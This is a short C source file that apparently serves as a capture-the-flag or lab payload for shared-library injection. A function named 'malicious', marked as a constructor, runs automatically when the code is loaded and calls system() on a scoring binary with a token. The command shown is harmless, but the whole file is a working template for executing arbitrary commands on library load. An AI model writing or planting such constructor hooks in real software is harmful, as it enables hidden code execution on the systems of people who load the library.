#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	    system("/usr/local/bin/score 24023b7c-a96f-434e-b845-33a9508335db");
}
